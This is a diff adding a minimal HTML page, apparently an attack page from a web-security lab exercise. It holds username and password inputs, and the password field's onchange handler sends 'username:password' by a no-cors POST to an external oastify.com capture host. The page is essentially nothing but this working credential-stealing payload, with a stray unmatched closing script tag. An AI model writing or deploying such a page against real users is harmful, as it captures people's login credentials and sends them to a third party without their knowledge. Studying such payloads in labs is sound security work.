@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <input name=username id=username>
+    <input type=password name=password onchange="if(this.value.length) fetch('https://1cec6dlkl3ee597gjlshbohnze55tzho.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: username.value+':'+this.value
+    });">
+</script>
+    
+</body>
+</html>
